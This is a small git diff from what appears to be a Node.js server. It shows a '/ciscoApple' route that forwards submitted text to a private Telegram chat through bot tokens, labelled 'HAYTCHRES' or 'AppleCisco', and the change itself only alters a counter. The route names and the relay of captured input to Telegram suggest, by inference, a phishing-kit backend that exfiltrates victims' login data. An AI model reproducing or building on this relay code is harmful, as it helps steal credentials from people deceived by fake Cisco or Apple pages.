@@ -2637,7 +2637,7 @@ app.post("/ciscoApple", (req, res) => {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        ciscoCount = 0;
+        ciscoCount = 2;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCisco:\n${originalText}`
